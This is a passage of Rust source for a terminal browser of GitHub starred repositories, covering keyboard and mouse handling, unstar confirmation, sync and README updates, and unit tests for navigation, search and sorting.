                    self.set_status(Level::Warn, "Not a GitHub repository; y copies its URL");
                    return;
                }
            }
        } else {
            r.html_url.clone()
        };
        self.effects.push(Effect::Copy(text));
    }

    fn request_unstar(&mut self) {
        if !self.can_write {
            self.set_status(
                Level::Warn,
                "Unstar needs a GitHub token (gh auth login or GITHUB_TOKEN)",
            );
            return;
        }
        let Some(r) = self.selected_repo() else {
            return;
        };
        // An awesome row can be unstarred only when it is in your stars;
        // the unstar then acts on the starred copy (its id and name).
        let target = if self.in_awesome() {
            let name = r.full_name.to_lowercase();
            self.repos
                .iter()
                .find(|s| s.full_name.to_lowercase() == name)
        } else {
            Some(r)
        };
        match target {
            Some(t) => {
                self.overlay = Overlay::ConfirmUnstar {
                    id: t.id,
                    full_name: t.full_name.clone(),
                }
            }
            None => self.set_status(Level::Info, "Not in your stars"),
        }
    }

    fn open_language_picker(&mut self) {
        let mut counts: HashMap<&str, usize> = HashMap::new();
        let rows = self.rows();
        for r in rows {
            if let Some(l) = r.language.as_deref() {
                *counts.entry(l).or_default() += 1;
            }
        }
        let mut items: Vec<(Option<String>, usize)> = counts
            .into_iter()
            .map(|(l, n)| (Some(l.to_string()), n))
            .collect();
        items.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
        items.insert(0, (None, rows.len()));
        let selected = items
            .iter()
            .position(|(l, _)| *l == self.language)
            .unwrap_or(0);
        self.overlay = Overlay::Languages { items, selected };
    }

    pub fn start_sync(&mut self, full: bool) {
        if self.syncing {
            self.set_status(Level::Info, "A sync is already running");
            return;
        }
        self.syncing = true;
        self.effects.push(Effect::Sync { full });
        // A full refresh also re-fetches the chosen awesome list (the index
        // is refreshed by the sync itself).
        if full && let Some(sel) = self.awesome.selection.clone() {
            self.choose_awesome(sel, true);
        }
    }

    // ── Input ───────────────────────────────────────────────────────────────

    pub fn handle_key(&mut self, key: KeyEvent) {
        if key.kind == KeyEventKind::Release {
            return;
        }
        let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
        if ctrl && matches!(key.code, KeyCode::Char('c')) {
            self.should_quit = true;
            return;
        }
        if ctrl && matches!(key.code, KeyCode::Char('l')) {
            self.effects.push(Effect::ClearScreen);
            return;
        }

        match &mut self.overlay {
            Overlay::None => {}
            Overlay::Help => {
                self.overlay = Overlay::None;
                return;
            }
            Overlay::Languages { items, selected } => {
                match key.code {
                    KeyCode::Up | KeyCode::Char('k') => *selected = selected.saturating_sub(1),
                    KeyCode::Down | KeyCode::Char('j') => {
                        *selected = (*selected + 1).min(items.len().saturating_sub(1))
                    }
                    KeyCode::Home | KeyCode::Char('g') => *selected = 0,
                    KeyCode::End | KeyCode::Char('G') => *selected = items.len().saturating_sub(1),
                    KeyCode::Enter => {
                        let choice = items.get(*selected).and_then(|(l, _)| l.clone());
                        self.overlay = Overlay::None;
                        self.language = choice;
                        self.refilter();
                    }
                    KeyCode::Esc | KeyCode::Char('q') => self.overlay = Overlay::None,
                    _ => {}
                }
                return;
            }
            Overlay::AwesomePicker { .. } => {
                self.handle_picker_key(key, ctrl);
                return;
            }
            Overlay::ConfirmUnstar { id, full_name } => {
                match key.code {
                    KeyCode::Char('y') | KeyCode::Char('Y') | KeyCode::Enter => {
                        self.effects.push(Effect::Unstar {
                            id: *id,
                            full_name: full_name.clone(),
                        });
                        self.overlay = Overlay::None;
                    }
                    KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Esc | KeyCode::Char('q') => {
                        self.overlay = Overlay::None
                    }
                    _ => {}
                }
                return;
            }
        }

        if self.searching {
            self.handle_search_key(key, ctrl);
            return;
        }

        match key.code {
            KeyCode::Char('q') | KeyCode::Char('Q') => self.should_quit = true,
            KeyCode::Char('?') => self.overlay = Overlay::Help,
            KeyCode::Char('/') => {
                self.searching = true;
                self.focus = Focus::Repos;
            }
            KeyCode::Esc => {
                if !self.search.is_empty() {
                    self.search.clear();
                    self.refilter();
                } else if self.show_detail {
                    self.show_detail = false;
                    if self.focus == Focus::Detail {
                        self.focus = Focus::Repos;
                    }
                }
            }
            KeyCode::Tab => self.cycle_focus(true),
            KeyCode::BackTab => self.cycle_focus(false),
            KeyCode::Left | KeyCode::Char('h') => self.focus_left(),
            KeyCode::Right => self.focus_right(),
            KeyCode::Up | KeyCode::Char('k') => self.move_focused(-1),
            KeyCode::Down | KeyCode::Char('j') => self.move_focused(1),
            KeyCode::PageUp => self.page_focused(-self.page()),
            KeyCode::PageDown => self.page_focused(self.page()),
            KeyCode::Char('u') if ctrl => self.page_focused(-(self.page() / 2).max(2)),
            KeyCode::Char('d') if ctrl => self.page_focused((self.page() / 2).max(2)),
            KeyCode::Home | KeyCode::Char('g') => self.jump(false),
            KeyCode::End | KeyCode::Char('G') => self.jump(true),
            // Enter on the Awesome row opens the list picker; elsewhere it
            // opens the selected repo even from the sidebar (v0.1).
            KeyCode::Enter if self.focus == Focus::Categories && self.in_awesome() => {
                self.open_awesome_picker()
            }
            KeyCode::Enter | KeyCode::Char('o') => self.open_selected(),
            KeyCode::Char('d') => {
                self.show_detail = !self.show_detail;
                if self.show_detail {
                    // Retry READMEs that failed earlier (e.g. while offline).
                    self.readmes.retain(|_, r| !matches!(r, Readme::Failed(_)));
                } else if self.focus == Focus::Detail {
                    self.focus = Focus::Repos;
                }
                self.selection_moved();
            }
            KeyCode::Char('y') => self.copy_selected(false),
            KeyCode::Char('Y') => self.copy_selected(true),
            // Each pane has its own sort; `s` cycles the focused one.
            KeyCode::Char('s') | KeyCode::Char('S') => match self.focus {
                Focus::Categories => self.cycle_cat_sort(),
                _ => self.cycle_sort(),
            },
            KeyCode::Char('l') => self.open_language_picker(),
            KeyCode::Char('a') => {
                self.hide_archived = !self.hide_archived;
                self.refilter();
                let state = if self.hide_archived {
                    "hidden"
                } else {
                    "shown"
                };
                self.set_status(Level::Info, format!("Archived repos {state}"));
            }
            KeyCode::Char('f') => {
                self.hide_forks = !self.hide_forks;
                self.refilter();
                let state = if self.hide_forks { "hidden" } else { "shown" };
                self.set_status(Level::Info, format!("Forks {state}"));
            }
            KeyCode::Char('r') | KeyCode::Char('R') => self.start_sync(true),
            KeyCode::Char('u') => self.request_unstar(),
            _ => {}
        }
    }

    fn handle_search_key(&mut self, key: KeyEvent, ctrl: bool) {
        match key.code {
            KeyCode::Esc => {
                self.search.clear();
                self.searching = false;
                self.refilter();
            }
            KeyCode::Enter => {
                // v0.1 behavior: leave search mode (keeping the filter) and
                // open the selected match, so "/name<Enter>" jumps straight there.
                self.searching = false;
                self.open_selected();
            }
            KeyCode::Backspace => {
                self.search.pop();
                self.repo_sel = 0;
                self.rebuild_visible();
            }
            KeyCode::Char('u') if ctrl => {
                self.search.clear();
                self.repo_sel = 0;
                self.rebuild_visible();
            }
            KeyCode::Up => self.move_repo(-1),
            KeyCode::Down => self.move_repo(1),
            KeyCode::PageUp => self.move_repo(-self.page()),
            KeyCode::PageDown => self.move_repo(self.page()),
            KeyCode::Char(c) if !ctrl && !c.is_control() && self.search.chars().count() < 100 => {
                self.search.push(c);
                self.repo_sel = 0;
                self.rebuild_visible();
            }
            _ => {}
        }
    }

    pub fn handle_mouse(&mut self, ev: MouseEvent) {
        if self.overlay != Overlay::None {
            return;
        }
        let pos = Position::new(ev.column, ev.row);
        let r = self.regions;
        let in_detail = r.detail.is_some_and(|d| d.contains(pos));
        match ev.kind {
            MouseEventKind::ScrollDown | MouseEventKind::ScrollUp => {
                let delta = if ev.kind == MouseEventKind::ScrollDown {
                    1
                } else {
                    -1
                };
                if in_detail {
                    self.scroll_readme(delta * 3);
                } else if r.categories.contains(pos) {
                    let next = (self.cat_sel as isize + delta)
                        .clamp(0, self.categories.len().saturating_sub(1) as isize);
                    self.move_category(next - self.cat_sel as isize);
                } else if r.repos.contains(pos) {
                    self.scroll_repo(delta);
                }
            }
            MouseEventKind::Down(MouseButton::Left) => {
                if in_detail {
                    self.focus = Focus::Detail;
                } else if let Some(row) = inner_row(r.categories, pos) {
                    self.focus = Focus::Categories;
                    if let Some(idx) = self.category_at_row(row) {
                        if idx == self.cat_sel && self.in_awesome() {
                            self.open_awesome_picker();
                        } else {
                            self.move_category(idx as isize - self.cat_sel as isize);
                        }
                    }
                } else if let Some(row) = inner_row(r.repos, pos) {
                    self.focus = Focus::Repos;
                    let idx = self.repo_list.offset() + row / REPO_ITEM_HEIGHT;
                    if idx < self.visible.len() {
                        if idx == self.repo_sel {
                            self.open_selected();
                        } else {
                            self.move_repo(idx as isize - self.repo_sel as isize);
                        }
                    }
                }
            }
            _ => {}
        }
    }

    /// The chosen list's line under "Awesome" is shown (it makes the
    /// Awesome item two rows tall).
    pub fn awesome_expanded(&self) -> bool {
        self.in_awesome() && self.awesome.selection.is_some()
    }

    /// Category index at inner row `row` of the sidebar.
    fn category_at_row(&self, row: usize) -> Option<usize> {
        let mut y = 0;
        for idx in self.cat_list.offset()..self.categories.len() {
            let h = if self.categories[idx].0 == AWESOME && self.awesome_expanded() {
                2
            } else {
                1
            };
            if row < y + h {
                return Some(idx);
            }
            y += h;
        }
        None
    }

    // ── Time and background results ─────────────────────────────────────────

    /// Periodic housekeeping: expire status, animate spinner, debounce README
    /// fetches. Returns true when a redraw is needed.
    pub fn tick(&mut self, now: Instant) -> bool {
        let mut redraw = false;
        if self.syncing || self.awesome.loading {
            self.frame = self.frame.wrapping_add(1);
            redraw = true;
        }
        if self
            .status
            .as_ref()
            .is_some_and(|s| now.duration_since(s.at) > s.ttl())
        {
            self.status = None;
            redraw = true;
        }
        if self.show_detail
            && now.duration_since(self.selection_changed) >= README_DEBOUNCE
            && let Some(r) = self.selected_repo()
            && !self.readmes.contains_key(&r.id)
            && crate::awesome::github_repo(&r.html_url).is_some()
        {
            let (id, full_name) = (r.id, r.full_name.clone());
            self.readmes.insert(id, Readme::Loading);
            self.effects.push(Effect::FetchReadme { id, full_name });
            redraw = true;
        }
        redraw
    }

    /// Apply a background result.
    pub fn apply(&mut self, msg: BgMsg) {
        match msg {
            BgMsg::SyncProgress(p) => {
                self.syncing = true;
                self.progress = Some(sanitize(&p));
            }
            BgMsg::SyncWarning(w) => self.set_status(Level::Warn, w),
            BgMsg::SyncDone(cache) => {
                self.syncing = false;
                self.sync_error = None;
                let done = self.progress.take();
                self.ingest(*cache);
                // A routine "up to date" must not bury a notice, warning or
                // error that is still on screen (e.g. the startup upgrade note).
                if self.status.as_ref().is_none_or(|s| s.level == Level::Info) {
                    self.set_status(Level::Info, done.unwrap_or_else(|| "Sync complete".into()));
                }
            }
            BgMsg::SyncFailed { error, partial } => {
                self.syncing = false;
                self.progress = None;
                if let Some(p) = partial {
                    self.ingest(*p);
                }
                let error = sanitize(&error);
                self.set_status(Level::Error, format!("Sync failed: {error}"));
                // Stays on the idle status line until a sync succeeds (v0.1
                // kept the error visible; the transient status expires).
                self.sync_error = Some(error);
            }
            BgMsg::Readme { id, result } => {
                let state = match result {
                    Ok(Some(text)) => Readme::Loaded(text),
                    Ok(None) => Readme::Missing,
                    Err(e) => Readme::Failed(sanitize(&e)),
                };
                self.readmes.insert(id, state);
            }
            BgMsg::Unstarred {
                id,
                full_name,
                result,
            } => match result {
                Ok(()) => {
                    let keep_cat = self.selected_category().to_string();
                    if let Some(pos) = self.repos.iter().position(|r| r.id == id) {
                        self.repos.remove(pos);
                        self.docs.remove(pos);
                    }
                    self.starred_names.remove(&full_name.to_lowercase());
                    self.rebuild_categories(&keep_cat);
                    self.rebuild_visible();
                    self.set_status(Level::Info, format!("Unstarred {full_name}"));
                }
                Err(e) => self.set_status(Level::Error, format!("Unstar failed: {e}")),
            },
            BgMsg::Copied(result) => match result {
                Ok(text) => self.set_status(Level::Info, format!("Copied {text}")),
                Err(e) => self.set_status(Level::Error, format!("Copy failed: {e}")),
            },
            BgMsg::Opened(result) => {
                if let Err(e) = result {
                    self.set_status(Level::Error, format!("Could not open browser: {e}"));
                }
            }
            BgMsg::AwesomeIndex(index) => self.awesome.index = Some(*index),
            BgMsg::AwesomeList { repo, rows, done } => {
                if !self.is_current_awesome(&repo) {
                    return;
                }
                let keep_repo = self.selected_repo().map(|r| r.id);
                let keep_cat = self.selected_category().to_string();
                let rows: Vec<StarredRepo> = rows.into_iter().map(StarredRepo::sanitized).collect();
                self.awesome.docs = rows.iter().map(Doc::new).collect();
                self.awesome.repos = rows;
                self.sort_awesome();
                if done {
                    self.awesome.loading = false;
                    self.awesome.progress = None;
                }
                self.rebuild_categories(&keep_cat);
                if self.in_awesome() {
                    self.rebuild_visible();
                    if let Some(id) = keep_repo {
                        self.select_repo_id(id);
                    }
                }
            }
            BgMsg::AwesomeProgress { repo, text } => {
                if self.is_current_awesome(&repo) {
                    self.awesome.progress = Some(sanitize(&text));
                }
            }
            BgMsg::AwesomeFailed { repo, error } => {
                if self.is_current_awesome(&repo) {
                    let error = sanitize(&error);
                    self.awesome.loading = false;
                    self.awesome.progress = None;
                    self.set_status(Level::Error, format!("Awesome list failed: {error}"));
                    self.awesome.error = Some(error);
                }
            }
        }
    }

    fn is_current_awesome(&self, repo: &str) -> bool {
        self.awesome
            .selection
            .as_ref()
            .is_some_and(|s| s.repo.eq_ignore_ascii_case(repo))
    }

    /// Take queued effects.
    pub fn drain_effects(&mut self) -> Vec<Effect> {
        std::mem::take(&mut self.effects)
    }
}

/// Move a cursor in a list of `len` items. Single steps wrap around (as in
/// v0.1: `j` on the last item goes to the first); larger jumps clamp, so
/// PgDn near the bottom stops at the last item instead of wrapping.
fn step(cur: usize, delta: isize, len: usize) -> usize {
    debug_assert!(len > 0);
    if delta.unsigned_abs() == 1 {
        (cur as isize + delta).rem_euclid(len as isize) as usize
    } else {
        cur.saturating_add_signed(delta).min(len - 1)
    }
}

/// Row index inside a bordered region, or `None` outside its inner area.
fn inner_row(area: Rect, pos: Position) -> Option<usize> {
    let inner = Rect::new(
        area.x.saturating_add(1),
        area.y.saturating_add(1),
        area.width.saturating_sub(2),
        area.height.saturating_sub(2),
    );
    inner.contains(pos).then(|| (pos.y - inner.y) as usize)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn repo(id: u64, name: &str, stars: u64, cat: &str, lang: Option<&str>) -> StarredRepo {
        StarredRepo {
            id,
            full_name: format!("o/{name}"),
            name: name.into(),
            html_url: format!("https://github.com/o/{name}"),
            stargazers_count: stars,
            category: cat.into(),
            language: lang.map(str::to_string),
            ..StarredRepo::test_default()
        }
    }

    fn app() -> App {
        let cache = StarCache {
            repos: vec![
                repo(1, "alpha", 10, "Rust", Some("Rust")),
                repo(2, "beta", 50, "Other", Some("Python")),
                repo(3, "gamma", 30, "Rust", Some("Rust")),
                repo(4, "delta", 5, "Other", None),
            ],
            ..Default::default()
        };
        let mut a = App::new("me", cache, SortMode::Stars, true);
        a.regions.repo_page = 2;
        a
    }

    fn key(c: KeyCode) -> KeyEvent {
        KeyEvent::new(c, KeyModifiers::NONE)
    }
    fn ch(c: char) -> KeyEvent {
        key(KeyCode::Char(c))
    }
    fn ctrl(c: char) -> KeyEvent {
        KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL)
    }
    fn names(a: &App) -> Vec<&str> {
        a.visible
            .iter()
            .map(|&i| a.rows()[i].name.as_str())
            .collect()
    }

    #[test]
    fn sorted_by_stars_initially() {
        assert_eq!(names(&app()), ["beta", "gamma", "alpha", "delta"]);
    }

    #[test]
    fn single_steps_wrap_but_paging_clamps() {
        let mut a = app();
        // v0.1 behavior: k on the first item wraps to the last, j wraps back.
        a.handle_key(key(KeyCode::Up));
        assert_eq!(a.repo_sel, 3);
        a.handle_key(ch('j'));
        assert_eq!(a.repo_sel, 0);
        // Paging clamps at the ends instead of wrapping.
        a.handle_key(key(KeyCode::PageUp));
        assert_eq!(a.repo_sel, 0);
        a.handle_key(key(KeyCode::PageDown));
        a.handle_key(key(KeyCode::PageDown));
        a.handle_key(key(KeyCode::PageDown));
        assert_eq!(a.repo_sel, 3);
        a.handle_key(ch('g'));
        assert_eq!(a.repo_sel, 0);
        a.handle_key(ch('G'));
        assert_eq!(a.repo_sel, 3);
    }

    #[test]
    fn category_selection_filters() {
        let mut a = app();
        a.handle_key(key(KeyCode::Left));
        assert_eq!(a.focus, Focus::Categories);
        a.handle_key(key(KeyCode::Down)); // "Awesome" (pinned second)
        a.handle_key(key(KeyCode::Down)); // "Rust"
        assert_eq!(a.selected_category(), "Rust");
        assert_eq!(names(&a), ["gamma", "alpha"]);
    }

    #[test]
    fn tab_cycles_focus_forward_and_back() {
        let mut a = app();
        assert_eq!(a.focus, Focus::Repos);
        a.handle_key(key(KeyCode::Tab));
        assert_eq!(a.focus, Focus::Categories);
        a.handle_key(key(KeyCode::BackTab));
        assert_eq!(a.focus, Focus::Repos);
        a.handle_key(ch('d'));
        a.handle_key(key(KeyCode::Tab));
        assert_eq!(a.focus, Focus::Detail);
    }

    #[test]
    fn search_enter_opens_match_and_keeps_filter() {
        let mut a = app();
        a.handle_key(ch('/'));
        assert!(a.searching);
        for c in "gam".chars() {
            a.handle_key(ch(c));
        }
        assert_eq!(names(&a), ["gamma"]);
        a.handle_key(key(KeyCode::Enter));
        assert!(!a.searching);
        assert_eq!(names(&a), ["gamma"]);
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Open("https://github.com/o/gamma".into())],
            "v0.1 behavior: Enter in search opens the selected match"
        );
        a.handle_key(key(KeyCode::Esc));
        assert_eq!(a.visible.len(), 4);
    }

    #[test]
    fn v01_uppercase_aliases_and_enter_from_sidebar() {
        let mut a = app();
        a.handle_key(key(KeyCode::Left));
        a.handle_key(key(KeyCode::Enter));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Open("https://github.com/o/beta".into())],
            "Enter opens the selected repo even with the sidebar focused"
        );
        // v0.3: uppercase S still works, and like `s` it sorts the focused
        // pane, which here is the sidebar.
        a.handle_key(ch('S'));
        assert_eq!(a.cat_sort, CategorySort::Stars);
        a.handle_key(key(KeyCode::Right));
        a.handle_key(ch('S'));
        assert_eq!(a.sort, SortMode::RecentlyActive);
        a.handle_key(ch('R'));
        assert_eq!(a.drain_effects(), vec![Effect::Sync { full: true }]);
        a.handle_key(ch('Q'));
        assert!(a.should_quit);
    }

    #[test]
    fn q_in_search_is_text_but_ctrl_c_quits() {
        let mut a = app();
        a.handle_key(ch('/'));
        a.handle_key(ch('q'));
        assert!(!a.should_quit);
        assert_eq!(a.search, "q");
        a.handle_key(ctrl('c'));
        assert!(a.should_quit);
    }

    #[test]
    fn enter_and_o_open_selected() {
        let mut a = app();
        a.handle_key(key(KeyCode::Enter));
        a.handle_key(ch('o'));
        assert_eq!(
            a.drain_effects(),
            vec![
                Effect::Open("https://github.com/o/beta".into()),
                Effect::Open("https://github.com/o/beta".into())
            ]
        );
    }

    #[test]
    fn copy_url_and_clone_command() {
        let mut a = app();
        a.handle_key(ch('y'));
        a.handle_key(ch('Y'));
        assert_eq!(
            a.drain_effects(),
            vec![
                Effect::Copy("https://github.com/o/beta".into()),
                Effect::Copy("git clone https://github.com/o/beta.git".into())
            ]
        );
    }

    #[test]
    fn sort_cycle_preserves_selection() {
        let mut a = app();
        a.handle_key(key(KeyCode::Down)); // gamma
        a.handle_key(ch('s')); // recent
        a.handle_key(ch('s')); // name
        assert_eq!(names(&a), ["alpha", "beta", "delta", "gamma"]);
        assert_eq!(a.selected_repo().unwrap().name, "gamma");
    }

    #[test]
    fn language_picker_filters() {
        let mut a = app();
        a.handle_key(ch('l'));
        let Overlay::Languages { items, .. } = &a.overlay else {
            panic!("expected picker")
        };
        assert_eq!(items[0], (None, 4));
        assert_eq!(items[1], (Some("Rust".into()), 2));
        a.handle_key(key(KeyCode::Down));
        a.handle_key(key(KeyCode::Enter));
        assert_eq!(a.language.as_deref(), Some("Rust"));
        assert_eq!(names(&a), ["gamma", "alpha"]);
        assert_eq!(a.categories[0], ("All".into(), 2));
    }

    #[test]
    fn archived_and_fork_toggles() {
        let mut a = app();
        a.repos[0].archived = true; // beta (sorted first)
        a.handle_key(ch('a'));
        assert!(!names(&a).contains(&"beta"));
        a.handle_key(ch('a'));
        assert!(names(&a).contains(&"beta"));
    }

    #[test]
    fn unstar_requires_confirmation() {
        let mut a = app();
        a.handle_key(ch('u'));
        assert!(matches!(a.overlay, Overlay::ConfirmUnstar { id: 2, .. }));
        a.handle_key(ch('n'));
        assert_eq!(a.overlay, Overlay::None);
        assert!(a.drain_effects().is_empty());
        a.handle_key(ch('u'));
        a.handle_key(ch('y'));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Unstar {
                id: 2,
                full_name: "o/beta".into()
            }]
        );
        a.apply(BgMsg::Unstarred {
            id: 2,
            full_name: "o/beta".into(),
            result: Ok(()),
        });
        assert_eq!(a.total(), 3);
        assert!(!names(&a).contains(&"beta"));
    }

    #[test]
    fn unstar_without_token_warns() {
        let mut a = app();
        a.can_write = false;
        a.handle_key(ch('u'));
        assert_eq!(a.overlay, Overlay::None);
        assert_eq!(a.status.as_ref().unwrap().level, Level::Warn);
    }

    #[test]
    fn refresh_queues_one_full_sync() {
        let mut a = app();
        a.handle_key(ch('r'));
        a.handle_key(ch('r'));
        assert_eq!(a.drain_effects(), vec![Effect::Sync { full: true }]);
    }

    #[test]
    fn sync_done_preserves_selected_repo() {
        let mut a = app();
        a.handle_key(key(KeyCode::Down)); // gamma
        let mut repos: Vec<StarredRepo> = a.repos.clone();
        repos.push(repo(9, "zeta", 100, "Other", None));
        a.apply(BgMsg::SyncDone(Box::new(StarCache {
            repos,
            ..Default::default()
        })));
        assert_eq!(a.selected_repo().unwrap().name, "gamma");
        assert_eq!(a.total(), 5);
    }

    #[test]
    fn readme_fetch_is_debounced_and_once() {
        let mut a = app();
        a.handle_key(ch('d'));
        assert!(!a.tick(Instant::now()) || a.effects.is_empty());
        let later = Instant::now() + Duration::from_millis(300);
        a.tick(later);
        a.tick(later);
        assert_eq!(
            a.drain_effects(),
            vec![Effect::FetchReadme {
                id: 2,
                full_name: "o/beta".into()
            }]
        );
    }

    #[test]
    fn help_overlay_closes_on_any_key() {
        let mut a = app();
        a.handle_key(ch('?'));
        assert_eq!(a.overlay, Overlay::Help);
        a.handle_key(ch('x'));
        assert_eq!(a.overlay, Overlay::None);
    }

    #[test]
    fn mouse_click_selects_then_opens() {
        let mut a = app();
        a.regions.repos = Rect::new(20, 1, 60, 20);
        let click = |row| MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 30,
            row,
            modifiers: KeyModifiers::NONE,
        };
        a.handle_mouse(click(2 + 2)); // inner y=2; second item rows 4-5
        assert_eq!(a.repo_sel, 1);
        assert!(a.drain_effects().is_empty());
        a.handle_mouse(click(5));
        assert_eq!(
            a.drain_effects(),
            vec![Effect::Open("https://github.com/o/gamma".into())]
        );
    }

    #[test]
    fn search_ranks_by_relevance_then_sort_order() {
        // v0.2.1: relevance ranking replaced the v0.1 "filter, keep sort
        // order" fuzzy search, which matched most repos.
        let mk = |id, name: &str, stars, desc: &str| StarredRepo {
            id,
            full_name: format!("o/{name}"),
            name: name.into(),
            stargazers_count: stars,
            description: Some(desc.into()),
            ..StarredRepo::test_default()
        };
        let cache = StarCache {
            repos: vec![
                mk(1, "big-lib", 900, "plugins for gamma rays"), // description match
                mk(2, "gamma", 5, "a small tool"),               // title match
                mk(3, "other", 800, "unrelated"),                // no match
                mk(4, "mid-lib", 500, "gamma helpers"),          // description match
            ],
            ..Default::default()
        };
        let mut a = App::new("me", cache, SortMode::Stars, false);
        a.handle_key(ch('/'));
        for c in "GAMMA".chars() {
            a.handle_key(ch(c)); // case-insensitive
        }
        // Title match first despite fewest stars; equal-relevance description
        // matches keep star order; the unrelated repo is not listed.
        assert_eq!(names(&a), ["gamma", "big-lib", "mid-lib"]);
    }

    #[test]
    fn paging_and_jumps_act_on_repo_list_from_sidebar() {
        let mut a = app();
        a.handle_key(key(KeyCode::Left));
        assert_eq!(a.focus, Focus::Categories);
        a.handle_key(ch('G'));
        assert_eq!(a.repo_sel, 3, "G jumps to the last repo (v0.1)");
        assert_eq!(a.cat_sel, 0, "category untouched");
        a.handle_key(key(KeyCode::PageUp));
        assert_eq!(a.repo_sel, 1);
        a.handle_key(key(KeyCode::Home));
        assert_eq!(a.repo_sel, 0);
    }

    #[test]
    fn mouse_wheel_clamps_instead_of_wrapping() {
        let mut a = app();
        a.regions.repos = Rect::new(20, 1, 60, 20);
        let wheel = |kind| MouseEvent {
            kind,
            column: 30,
            row: 5,
            modifiers: KeyModifiers::NONE,
        };
        a.handle_mouse(wheel(MouseEventKind::ScrollUp));
        assert_eq!(a.repo_sel, 0, "wheel up at the top stays at the top");
        for _ in 0..10 {
            a.handle_mouse(wheel(MouseEventKind::ScrollDown));
        }
        assert_eq!(
            a.repo_sel, 3,
            "wheel down at the bottom stays at the bottom"
        );
    }

    #[test]
    fn sync_error_persists_until_next_success() {
        let mut a = app();
        a.apply(BgMsg::SyncFailed {
            error: "network down".into(),
            partial: None,
        });
        a.tick(Instant::now() + Duration::from_secs(60));
        assert!(a.status.is_none(), "transient status expired");
        assert_eq!(a.sync_error.as_deref(), Some("network down"));
        a.apply(BgMsg::SyncDone(Box::new(StarCache {
            repos: a.repos.clone(),
            ..Default::default()
        })));
        assert!(a.sync_error.is_none());
    }

    #[test]
    fn failed_readme_is_retried_when_detail_reopened() {
        let mut a = app();
        a.readmes.insert(2, Readme::Failed("offline".into()));
        a.handle_key(ch('d'));
        assert!(!a.readmes.contains_key(&2));
    }

    #[test]
    fn own_repos_view_lists_owner_matches_and_keeps_categories() {
        let repos = vec![
            StarredRepo {
                id: 1,
                full_name: "Me/tool".into(),
                html_url: "https://github.com/Me/tool".into(),
                category: "Security".into(),
                ..StarredRepo::test_default()
            },
            StarredRepo {
                id: 2,
                full_name: "other/lib".into(),
                html_url: "https://github.com/other/lib".into(),
                category: "Security".into(),
                ..StarredRepo::test_default()
            },
            StarredRepo {
                id: 3,
                // Owner merely *contains* the login: not ours.
                full_name: "me-fan/thing".into(),
                html_url: "https://github.com/me-fan/thing".into(),
                category: "Other".into(),
                ..StarredRepo::test_default()
            },
        ];
        let cache = StarCache {
            repos,
            ..Default::default()
        };
        // Browsing "me": the owner "Me" matches case-insensitively.
        let mut a = App::new("me", cache, SortMode::Name, false);
        let labels: Vec<&str> = a.categories.iter().map(|(c, _)| c.as_str()).collect();
        assert_eq!(
            labels,
            ["All", "Awesome", "me's repos", "Security", "Other"]
        );
        assert_eq!(a.categories[2].1, 1);

        a.handle_key(key(KeyCode::Left));
        a.handle_key(key(KeyCode::Down)); // Awesome
        a.handle_key(key(KeyCode::Down)); // me's repos
        assert_eq!(a.visible.len(), 1);
        assert_eq!(a.repos[a.visible[0]].full_name, "Me/tool");

        // ...and it is still listed under its real category.
        a.handle_key(key(KeyCode::Down));
        assert_eq!(a.selected_category(), "Security");
        assert!(a.visible.iter().any(|&i| a.repos[i].full_name == "Me/tool"));
    }

    /// Repos spread over three categories with distinct counts and dates.
    fn sortable_app() -> App {
        use chrono::{TimeZone, Utc};
        let t = |d: u32| Some(Utc.with_ymd_and_hms(2026, 1, d, 0, 0, 0).unwrap());
        let mk = |id, owner: &str, cat: &str, pushed: u32, starred: u32| StarredRepo {
            id,
            full_name: format!("{owner}/r{id}"),
            name: format!("r{id}"),
            category: cat.into(),
            pushed_at: t(pushed),
            starred_at: t(starred),
            ..StarredRepo::test_default()
        };
        let cache = StarCache {
            repos: vec![
                mk(1, "me", "Rust", 1, 1),
                mk(2, "x", "Rust", 2, 2),
                mk(3, "x", "Rust", 3, 3),
                mk(4, "x", "Databases", 20, 4),
                mk(5, "x", "AI / ML", 5, 25),
                mk(6, "x", "AI / ML", 6, 6),
            ],
            ..Default::default()
        };
        App::new("me", cache, SortMode::Stars, false)
    }

    fn cat_names(a: &App) -> Vec<&str> {
        a.categories.iter().map(|(c, _)| c.as_str()).collect()
    }

    #[test]
    fn category_sorts_keep_pinned_rows_on_top() {
        let mut a = sortable_app();
        // Default: the fixed category order.
        assert_eq!(
            cat_names(&a),
            [
                "All",
                "Awesome",
                "me's repos",
                "Rust",
                "AI / ML",
                "Databases"
            ]
        );
        a.set_cat_sort(CategorySort::Stars); // by repo count: Rust 3, AI 2, DB 1
        assert_eq!(
            cat_names(&a),
            [
                "All",
                "Awesome",
                "me's repos",
                "Rust",
                "AI / ML",
                "Databases"
            ]
        );
        a.set_cat_sort(CategorySort::RecentlyActive); // DB pushed 20th, AI 6th, Rust 3rd
        assert_eq!(
            cat_names(&a),
            [
                "All",
                "Awesome",
                "me's repos",
                "Databases",
                "AI / ML",
                "Rust"
            ]
        );
        a.set_cat_sort(CategorySort::Name);
        assert_eq!(
            cat_names(&a),
            [
                "All",
                "Awesome",
                "me's repos",
                "AI / ML",
                "Databases",
                "Rust"
            ]
        );
        a.set_cat_sort(CategorySort::StarredAt); // AI starred 25th, DB 4th, Rust 3rd
        assert_eq!(
            cat_names(&a),
            [
                "All",
                "Awesome",
                "me's repos",
                "AI / ML",
                "Databases",
                "Rust"
            ]
        );
    }

    #[test]
    fn s_cycles_the_focused_panes_sort_only() {
        let mut a = sortable_app();
        a.handle_key(key(KeyCode::Left)); // focus Categories
        a.handle_key(ch('s'));
        assert_eq!(a.cat_sort, CategorySort::Stars);
        assert_eq!(a.sort, SortMode::Stars, "repo sort untouched");
        a.handle_key(key(KeyCode::Right)); // focus Repos
        a.handle_key(ch('s'));
        assert_eq!(a.sort, SortMode::RecentlyActive);
        assert_eq!(a.cat_sort, CategorySort::Stars, "category sort untouched");
        // The cycle returns to the default order after the four modes.
        a.handle_key(key(KeyCode::Left));
        for _ in 0..4 {
            a.handle_key(ch('s'));
        }
        assert_eq!(a.cat_sort, CategorySort::Default);
    }

    #[test]
